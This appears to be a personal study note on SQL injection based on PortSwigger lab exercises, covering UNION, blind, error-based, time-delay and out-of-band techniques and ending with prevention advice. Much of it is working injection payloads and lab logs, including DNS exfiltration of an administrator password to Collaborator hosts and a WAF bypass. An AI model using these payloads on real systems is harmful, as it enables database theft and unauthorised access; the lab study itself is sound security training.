---
tags:
  - SQL
  - SQLi
  - sqlmap
refs:
  - https://portswigger.net/web-security/learning-paths/sql-injection
---
---
**Other Links:**
1. [[SQL Map]]
2. [[Common Injects]]
---
## Basics
1. Allows attacker to interfere with queries that an application makes it to its database
2. Retrieve data they normally shouldn't retrieve
3. Modify or delete data even sometimes DoS or compromising other back-end infrastructure
---
## Detect
- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
---
## Common queries
- In `SELECT` statements, within the `WHERE` clause
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.
---
## Typical Approach
1. sqlmap automated scan
[[SQLMAP]]
2. Manual scan (below detailed)
```
# Find columns in table
' UNION SELECT 1,2,3,4,... #

# Find DB version
' union select 1,2,3,4,5,@@version #

# Find DB names
' union select 1,2,3,4,5,concat(schema_name) FROM information_schema.schemata #

# Find table names
' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='Staff' #

# Find information (users example)
' union SELECT 1,2,3,4,5,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='users' #

# Find column names in table
' union SELECT 1,2,3,4,5,column_name FROM information_schema.columns WHERE table_name = 'StaffDetails' #

# Dump data
' union select 1,2,3,4,5,group_concat(username," | ",password) From users.UserDetails #
```
---
# Manual Scan approach (detailed)
## Retrieve Hidden Data (No defence)
**Standard Interaction**
```
`https://insecure-website.com/products?category=Gifts`
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
```
### Comment out following statements **( '-- )**
```http
https://insecure-website.com/products?category=Gifts'--
```
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
- Example above comments out remaining SQL statement to show unreleased items
### Show other categories as well with a true statement **( ' OR 1=1-- )**
- Following statement is true so would ready category is gifts or categories where true=true
```
' OR 1=1--
```
```
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`
```
```sql
`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
```
---
## Subverting Application Logic (e.g. Login)
`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
- If statement is true login else unsuccessful 
### Comment out password
```
administrator'--
```

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
---
## UNION Attacks
- `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
This SQL query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.
**Requirements:**
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.
**So requires finding out**
- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.
### Determine Columns in query
**' ORDER BY x--**
- Order By statement until an error occurs
- Specify by index so you don't need to know names
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
- Look for any difference in response (HTML or SQL back-end error)
**' UNION SELECT NULL --**
- Must match datatype in original statement thus null is convertible to all data types
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
- If Null doesn't match the following columns expect a response such as `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`
- Look for differences in response. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.
Example:
```
https://0a1f00c9047134198081f3a100c600cd.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20NULL,NULL,NULL--

# Loads with above but any different amount of Nulls causes Internal Server Error
```
---
## Finding Columns with useful Data Types (UNION)
- Identify interesting data
- After you determine how many columns can start identifying compatible data types
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
- If column is not compatible with string data, the injected query will cause a database error
Example: Lab: SQL injection UNION attack, finding a column containing text
```
https://0a4e003c041127d58008086200070061.web-security-academy.net/filter?category=Pets%27%20UNION%20SELECT%20NULL,%27mxLTUO%27,NULL--

Every other combination receives an Internal Server error
```
---
## Using a SQL Injection UNION attack to retrieve interesting data
1. Now you know columns and which hold string data you can retrieve interesting data
2. Example
	1. Query returns two columns both holding string data
	2. Injection point is a quoted string within the WHERE clause
	3. Database contains a table called users with the columns username and password
```
' UNION SELECT username, password FROM users--
```
- To do this attack you need to know/guess a table called users with two columns username and password
Example - Lab: SQL injection UNION attack, retrieving data from other tables
```
https://0abd009d0439e94681118b56005c00be.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20%27abc%27,%27abc%27--

No error so two columns


https://0abd009d0439e94681118b56005c00be.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20username,password%20FROM%20users--

Included in output
|carlos|jylxrlih4i7tc9umaumq|
```
---
## Retrieving multiple values within a single column
1. Query may only return a single column
2. Retrieve multiple values within one column by concatenating the values together
Oracle Example
```
' UNION SELECT username || '~' || password FROM users--
```
3. Using the double-pipe concatenates in Oracle the values username and password separated the ~
```
administrator~s3cure
wiener~peter
carlos~montoya
```
- See Database Specific Syntax for differences
Example - Lab: SQL injection UNION attack, retrieving multiple values in a single column
```
Found only 2nd column allows database

https://0a0a009203666d0b812e6b2800e7002b.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20NULL,%27abc%27--

Concatante one box into another
https://0a0a009203666d0b812e6b2800e7002b.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20SELECT%20NULL,username%20||%20%27~%27%20||%20password%20FROM%20users--

administrator~j3pmodq4mo01mvwavpm2
```
---
## Examine the Database in SQLi
### Query database type
| Database type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |
**Example**
```
' UNION SELECT @@version--

Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```
Lab:  SQL injection attack, querying the database type and version on MySQL and Microsoft
```
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL# HTTP/2

2 Categories

GET /filter?category=Gifts'+UNION+SELECT+'abc',NULL# HTTP/2
1st categories allows strings

GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL# HTTP/2
8.0.42-0ubuntu0.20.04.1
```
---
## List the Content of the database
- Most (except Oracle) have a set of views called information schema providing info about database
```
SELECT * FROM information_schema.tables
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```
- Output shows three tables, you can then query the list of columns
```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
Lab: SQL injection attack, listing the database contents on non-Oracle databases
```
/filter?category=Accessories%27%20UNION%20SELECT%20NULL,NULL--
= 2 columns

/filter?category=Accessories' UNION SELECT 'abc',NULL--
= Column 1 allows string input

/filter?category=Accessories' UNION SELECT table_name,'NULL'FROM information_schema.tables--
= Table names in output (users_ysmjox)

/filter?category=Accessories' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=users_ysmjox--
= Column names in output (username_ezsyht and password_urdvyh)

/filter?category=Accessories' UNION SELECT username_ezsyht,password_urdvyh FROM users_ysmjox--
= Entries in output (|administrator|rznh9a8itycefapck8xy|)
```
---
## Blind SQL
1. Occurs when app is vulnerable to SQL injection but HTTP responses do not contain results relevant of the SQL query or the details of any database errors
2. Techniques such as UNION attacks are not effective with blind SQLi, because they rely on seeing results of query within application responses (True or false responses often needed)
### Exploiting blind SQL injection by triggering conditional responses
- Consider application tracking cookies to gather analysis about usage
```
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
```
- If you submit a recognised tracking ID you get a welcome back because query is equal to 1 (True)
**Confirm blind SQL**
```
…xyz' AND '1'='1
…xyz' AND '1'='2
```
1. First query returns welcome back result
2. Second doesn't contain any welcome back result
Now we can determine an answer to any single injection, we can now extract data one piece at a time
- You can now construct statements to test if character is equal/higher/lower than a letter. Eventually finding the character
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm

xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
- Process continued until we find the full password
- Tip is using Burp suite search for the 'Welcome Back' string in HTTP Response
Lab: Blind SQL injection with conditional responses
```
**Confirm blind SQLi**
Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND '1'='1; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eRj
Welcome Back!

Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND '1'='2; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eR
No response

**Confrim a table callde users**
Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND (SELECT 'a' FROM users LIMIT 1)='a; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eRj
Welcome Back!

**Confirm username exists**
Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND (SELECT '1' FROM users WHERE username='administrator')='1; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eRj
Welcome Back!

**Detemine characters in password**
Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eR
Welcome Back!

---Continued incrementing and using equal to confirm---

Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eRj
Welcome Back! (Password length is 20)

**Detemine each character of the 20**
Cookie: TrackingId=iS9bs5hs4obh6Ym3' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a; session=aPQlehyT4iaVasimZkJ9fOj6kZRw7eRj

Analyse length in HTTP response and allign characters with positions
26scxh11sssanrlt55f5
```
---
## Error Based SQL Injection
- Able to see error messages to extract or infer sensitive data from database, even in blind contexts
- Induce application to return specific error response based on the result of a boolean expression (conditional errors)
- Output data returned by query - turning blind SQL into visible SQL (Verbose SQL error messages)
### Conditional Errors (Trigger blind SQL)
1. Modify the query so it returns an error if condition is true
2. Unhanded error thrown by database causes difference in application response, aiding you judge truth of above situation
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
3. Above expresses CASE of a which causes no error, below evaluates to 1/0 which causes a divide-by-zero error
4. If we can determine an difference in application response, we can see if injected conditions are true, such as receive one character at a time
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
Lab: Blind SQL injection with conditional errors
```
# See an extra ' causes an error

Cookie: TrackingId=dBtKZ5sTW60phDQW'; session=ubczeWwEb62ChGdaZuu8ciRhsjTFrb1B

Internal Server Error
# Two '' doesnt cause an error

# Confirm it is an SQL error
# All from the Cookie TrackingID=xyz\
'||(SELECT '')||'; session=ubczeWwEb62ChGdaZuu8ciRhsjTFrb1B
Internal Server Error!

`'||(SELECT '' FROM dual)||'`
# No longer receive an error thus is an Oracle Database (needs a FROM after)

# Table that doesn't exist receives an error
`'||(SELECT '' FROM not-a-real-table)||'`
Internal Server Error!

# So we can see if statement is correct based on error
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
# ROWNUM keeps ensures concatanation isnt made

# See error or no error based on true or false statements (CASE tests a condition to see if it's true)
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Internal Server Error!
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
# No error

# Check if adminsitrator user exist (Error = exist)
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Internal Server Error

# Check password length
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Internal error until >19 meaning password is 20 chars

# Burp intuder each position and character
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Cookie: TrackingId=dBtKZ5sTW60phDQW'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';
# Shorter lengths are error meaning it is right
j4be0o4rwwhh6msfpgz8
```
---
## Verbose SQL Error messages
- Reveal underlying query
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```
- Above you can comment out third ' to have a valid query
**Verbose data by trying to change it into valid type (CAST)**
```
`CAST((SELECT example_column FROM example_table) AS int)`

`ERROR: invalid input syntax for type integer: "Example data"`
```
Lab: Visible error-based SQL injection
```
TrackingId=H3b4EKpKjGltlcdg'--;
# ' causes error whereas commeting out following removes

TrackingId=H3b4EKpKjGltlcdg' AND CAST((SELECT 1) AS int)--;
ERROR: argument of AND must be type boolean, not type integer
  Position: 63
  
TrackingId=H3b4EKpKjGltlcdg' AND 1=CAST((SELECT 1) AS int)--;
# No error

' AND 1=CAST((SELECT username FROM users) AS int)--
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'H3b4EKpKjGltlcdg' AND 1=CAST((SELECT username FROM users) AS'. Expected  char
# Truncated so remove some characters from trackingID
TrackingId=H3b4EKpKjGltlcdg
TrackingId=H

ERROR: more than one row returned by a subquery used as an expression

# It expected more than one row so LIMIT however query still worked in backend to receive the error
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
ERROR: invalid input syntax for type integer: "administrator"

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
ERROR: invalid input syntax for type integer: "8cnu55h0h0dpodnggq1a"
```
---
## Blind SQL Injection by triggering time delays
1. In times where there is no application response but query can still be modified you can induce a time delay (for true or false)
2. Delaying SQL query in turn delays HTTP response
3. MSSQL example for triggering a delay depending on if expression is true
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```
4. First doesn't trigger delay, second will
5. Trigger delay one character at a time
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
Lab: Blind SQL injection with time delays and information retrieval
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

# Delay when 1=2 is not delay

# Add check for username and specify the table
Cookie: TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+USERS--;

# Add a check for password length
(username='administrator'+AND+LENGTH(password)>19)
# Last Delay is on 19 means password length is 20

# Burp intruder
(username='administrator'+AND+SUBSTRING(password,1,1)='a')
90ibwpw1kb22gjx27jk5
```
---
## Exploiting OAST (Out-of-band techniques)
1. Asynchronously - another thread is used for SQL query but can't see HTTP difference
2. App response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute
3. If all the above doesn't work - if SQL is executed still vulnerable
4. Network interactions to systems you control
	1. DNS
Burp Collaborator - server that provides custom implementions of network services such as DNS
MSSQL Trigger DNS query
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--

# Database looks up `0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`
```
Lab: Blind SQL injection with out-of-band interaction
```
# Combine basic XXE and SQL
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//x53dir19ztwbnwk5sczglvtvtmzdn5bu.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=A7rLOkssh6hQaZsKyuv6e2JwmWuFfFbd

# Insert collaborator and see response
The Collaborator server received a DNS lookup of type AAAA for the domain name **x53dir19ztwbnwk5sczglvtvtmzdn5bu.oastify.com**.  
  
The lookup was received from IP address 3.251.104.192:63969 at 2025-Nov-04 13:08:35.125 UTC.
```
**Having confirmed out-of-band interaction you can then use that channel to ex filtrate data**
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
- Read password for the Admin user append a unique subdomain and trigger a DNS lookup containing captured password
Lab: Blind SQL injection with out-of-band data exfiltration
```
# UNION select find the value of password and send request to subdomain with the subdomain as the password

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

# Append subdomain
Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.hyjxbbutsdpvggdplws0efmfm6sxgq4f.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=NN5OwmqHh8hcP08VieofJofOPDljeCDL

# DNS Requst shows password before domain
The Collaborator server received a DNS lookup of type A for the domain name **vti00qyw7li2nfc8093t.hyjxbbutsdpvggdplws0efmfm6sxgq4f.oastify.com**.  
  
The lookup was received from IP address 3.248.186.186:53497 at 2025-Nov-04 13:16:49.004 UTC.

administrator:vti00qyw7li2nfc8093t
```
---
## SQL Injection in different context
Any controllable input that is processed as a SQL query by application
1. POST and GET data
2. Cookies
3. Some take in JSON or XML format and query database from this
Example:
Encode XML-based SQL injection uses an XML escape sequence (bypass WAF key)
```
<stockCheck> <productId>123</productId> <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId> </stockCheck>
```
Lab: SQL injection with filter bypass via XML encoding
```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

# See if 1+1 is processed
`<storeId>1+1</storeId>`
# Differenet units returned

# Attempt to query more info (columns)
<storeId>1 UNION SELECT NULL</storeId>
"Attack detected"

# Bypass WAF - Hackvector extensions Encode > hex_entities
<storeId><@hex_entities>1 UNION SELECT NULL</@hex_entities></storeId>

# Response - you can return one column
51 units
null

# concatanate returned usernames and passwords
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>

# Send query
wiener~ldh8mpsd0xnyhqsescnu
carlos~iqovv5fnhq1ebf5tb49n
51 units
administrator~g4rqskq2zbxkgb29t32h
```
---
## Second-Order SQLi (stored SQLi)
1. First order occurs when app processes user input from HTTP request and incorporates input into a query in a unsafe way
2. Second order occurs when the application takes user input from a HTTP request and stores it for future use
	1. Place input into database, no initially vulnerable but later when handling a different HTTP request, the app retreives stored data and incorporates it into SQL query in an unsafe way
---
## Prevent SQLi
1. Parameterised queries (prepared statements) instead of string concatenation within the query
```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);

# Rewrite this code to prevent user input from interfering with query structure

PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
2. Whitelist permitted input values
3. Using different logic to deliver the required behaviour
---
## Database Specific Syntax
[[SQLi Cheatsheet for different databases]]
**ORACLE**
- Every SELECT must use the FROM keyword and specify a valid table
- An in-built table called dual can be used for this purpose
```
`' UNION SELECT NULL FROM DUAL--`
```
**MySQL**
```
-- must be followed by a space
# can also be used
```
